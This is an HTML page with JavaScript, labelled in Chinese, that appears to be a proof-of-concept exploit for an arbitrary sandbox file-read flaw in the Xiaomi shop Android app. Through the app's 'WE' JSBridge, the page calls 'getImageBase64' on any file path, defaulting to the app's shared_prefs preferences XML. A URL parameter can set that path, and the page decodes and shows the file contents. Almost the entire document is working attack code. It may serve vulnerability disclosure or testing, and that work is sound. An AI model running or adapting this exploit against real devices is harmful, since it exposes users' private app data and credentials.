<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>xmshop 任意文件读取 PoC</title>
  <style>
    body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,"PingFang SC","Microsoft YaHei",sans-serif; margin: 20px; line-height: 1.45; }
    h2 { margin-top: 0; }
    .row { margin: 10px 0; }
    input[type="text"] { width: 100%; padding: 8px; box-sizing: border-box; }
    button { padding: 8px 14px; margin-right: 8px; cursor: pointer; }
    pre { white-space: pre-wrap; word-break: break-word; border: 1px solid #ddd; padding: 10px; border-radius: 6px; background: #fafafa; min-height: 80px; }
    .ok { color: #0b8f29; }
    .bad { color: #c62828; }
    .muted { color: #666; font-size: 13px; }
  </style>
</head>
<body>
  <h2>xmshop 任意沙盒文件读取 PoC</h2>

  <div class="row">
    <div class="muted">目标文件路径（受害 app 沙盒路径）：</div>
    <input id="pathInput" type="text" value="/data/user/0/com.xiaomi.shop/shared_prefs/com.xiaomi.shop_preferences.xml" />
  </div>

  <div class="row">
    <button id="readBtn">读取文件</button>
    <button id="clearBtn">清空输出</button>
  </div>

  <div class="row">
    <strong>桥状态：</strong> <span id="bridgeState" class="bad">未初始化</span>
  </div>

  <div class="row">
    <strong>日志：</strong>
    <pre id="logBox"></pre>
  </div>

  <div class="row">
    <strong>读取结果（UTF-8 解码）：</strong>
    <pre id="resultBox"></pre>
  </div>

  <div class="row">
    <strong>Base64（原始）：</strong>
    <pre id="b64Box"></pre>
  </div>

  <script>
    (() => {
      const $ = (id) => document.getElementById(id);
      const logBox = $("logBox");
      const resultBox = $("resultBox");
      const b64Box = $("b64Box");
      const bridgeState = $("bridgeState");
      const pathInput = $("pathInput");

      const state = {
        nativeWE: null,
        pending: new Map()
      };

      function log(msg) {
        const t = new Date().toLocaleTimeString();
        logBox.textContent += `[${t}] ${msg}\n`;
      }

      function setBridgeState(ok, text) {
        bridgeState.className = ok ? "ok" : "bad";
        bridgeState.textContent = text;
      }

      function decodeBase64ToUtf8(base64) {
        const binary = atob(base64);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
        try {
          return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
        } catch (e) {
          return decodeURIComponent(escape(binary));
        }
      }

      function onNativeEmit(eventName, payload, cbId) {
        log(`收到回调: event=${eventName}, cbId=${cbId || ""}`);
        let parsed = null;
        try {
          parsed = typeof payload === "string" ? JSON.parse(payload) : payload;
        } catch (e) {
          log("payload 不是 JSON，按原文处理");
        }

        const code = parsed && typeof parsed.code !== "undefined" ? parsed.code : null;
        const data = parsed && typeof parsed.data !== "undefined" ? parsed.data : payload;

        if (eventName === "getImageBase64") {
          if (code === 0 && typeof data === "string" && data.length > 0) {
            b64Box.textContent = data;
            try {
              resultBox.textContent = decodeBase64ToUtf8(data);
              log(`读取成功，base64 长度=${data.length}`);
            } catch (e) {
              resultBox.textContent = "[解码失败，可能是二进制文件]\n" + String(e);
              log("读取成功，但 UTF-8 解码失败（可能是二进制）");
            }
          } else {
            resultBox.textContent = `读取失败: code=${code}, data=${typeof data === "string" ? data : JSON.stringify(data)}`;
            log(`读取失败: code=${code}`);
          }
        } else {
          log(`收到其它事件: ${eventName}`);
        }

        if (cbId && state.pending.has(cbId)) {
          clearTimeout(state.pending.get(cbId));
          state.pending.delete(cbId);
        }
      }

      function setupBridge() {
        const nativeWE = window.WE;
        if (!nativeWE || typeof nativeWE.trigger !== "function") {
          setBridgeState(false, "WE 不存在或 trigger 不可用");
          return false;
        }
        state.nativeWE = nativeWE;
        window.__nativeWE = nativeWE;

        try { nativeWE.emit = onNativeEmit; } catch (e) {}

        const wrapper = {
          emit: onNativeEmit,
          trigger: function(...args) { return nativeWE.trigger.apply(nativeWE, args); },
          triggerString: function(...args) {
            if (typeof nativeWE.triggerString === "function") {
              return nativeWE.triggerString.apply(nativeWE, args);
            }
            return null;
          }
        };
        try {
          if (!window.WE || typeof window.WE.emit !== "function") {
            window.WE = wrapper;
          }
        } catch (e) {
          window.WE = wrapper;
        }

        setBridgeState(true, "WE 已就绪");
        log("JSBridge 初始化成功");
        return true;
      }

      function triggerRead(path) {
        if (!setupBridge()) {
          log("桥接初始化失败，无法触发读取");
          return;
        }
        if (!path) {
          log("请输入文件路径");
          return;
        }
        const cbId = "cb_" + Date.now() + "_" + Math.random().toString(16).slice(2);
        log(`开始读取: ${path}`);
        try {
          const ok = window.WE.trigger("getImageBase64", path, cbId);
          log(`trigger 返回: ${ok}`);
        } catch (e) {
          log("trigger 异常: " + e);
          return;
        }
        const timer = setTimeout(() => {
          state.pending.delete(cbId);
          log("等待回调超时（6s）");
        }, 6000);
        state.pending.set(cbId, timer);
      }

      $("readBtn").addEventListener("click", () => triggerRead(pathInput.value.trim()));
      $("clearBtn").addEventListener("click", () => {
        logBox.textContent = "";
        resultBox.textContent = "";
        b64Box.textContent = "";
      });

      try {
        const qPath = new URLSearchParams(location.search).get("path");
        if (qPath) pathInput.value = qPath;
      } catch (e) {}

      setTimeout(setupBridge, 200);
    })();
  </script>
</body>
</html>
